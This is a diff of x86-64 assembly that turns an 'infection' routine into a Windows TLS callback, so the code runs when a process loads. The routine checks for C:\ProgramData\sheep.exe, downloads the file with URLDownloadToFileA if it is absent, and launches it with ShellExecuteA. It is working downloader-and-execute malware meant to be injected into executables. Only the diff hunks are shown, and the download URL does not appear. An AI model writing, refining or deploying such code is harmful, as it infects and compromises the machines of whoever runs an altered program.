@@ -1,18 +1,26 @@
 section .text
 [BITS 64]
 
-global main
+%define TLS
    
+global main
+   ; this is now a TLS callback, which has the following header:
+   ;
+   ;    VOID (NTAPI *PIMAGE_TLS_CALLBACK)(PVOID DllHandle, DWORD Reason, PVOID Reserved)
 main:
    mov [rsp+0x18],rsi
    mov [rsp+0x10],rdi
    mov [rsp+8],rbp
    mov rbp,rsp
-   ; sub rsp,0x40                 
+   sub rsp,0x28                 ; store registers in shadow space, realign the stack and create new shadowspace
 
-   call infection__data
-infection__data__start:
-infection__data__urlmon:
+%ifdef TLS
+   cmp edx,1
+   jnz infection__end           ; if the given Reason is DLL_PROCESS_ATTACH, do the needful
+                                ; otherwise, terminate the infection.
+   call infection__data         ; perform a call-pop to get offsets to our data
+infection__data__start:         ; this prevents relocations from forming because we are not
+infection__data__urlmon:        ; using absolute addresses for our data, making it more portable
    db "urlmon.dll",0
 infection__data__shell32:
    db "shell32.dll",0
@@ -52,7 +60,7 @@ infection__data:
    lea rcx, [rbx+(infection__data__sheep-infection__data__start)] ; C:\ProgramData\sheep.exe
    call r12                                                       ; GetFileAttributesA("C:\\ProgramData\\sheep.exe")
    xor r12d,r12d
-   mov [rsp+0x20],r12           ; pre-populate argument to URLDownloadToFileA
+   mov [rsp+0x28],r12           ; pre-populate argument to URLDownloadToFileA
    cmp eax, 0xFFFFFFFF          ; eax == INVALID_FILE_ATTRIBUTES
    jnz infection__payload_exists
 
@@ -65,7 +73,7 @@ infection__data:
    jnz infection__end           ; URLDownloadToFileA returning nonzero is an error
 
 infection__payload_exists:
-   mov dword [rsp+0x28], 1
+   mov dword [rsp+0x30], 1
    xor ecx,ecx
    xor edx,edx
    lea r8, [rbx+(infection__data__sheep-infection__data__start)]
@@ -73,7 +81,7 @@ infection__payload_exists:
    call rdi                     ; ShellExecuteA(nullptr, nullptr, "C:\\ProgramData\\sheep.exe", nullptr, nullptr, 1)
    
 infection__end:
-   add rsp,0x40
+   add rsp,0x48
    mov rsi,[rsp+0x18]
    mov rdi,[rsp+0x10]
    mov rbp,[rsp+8]
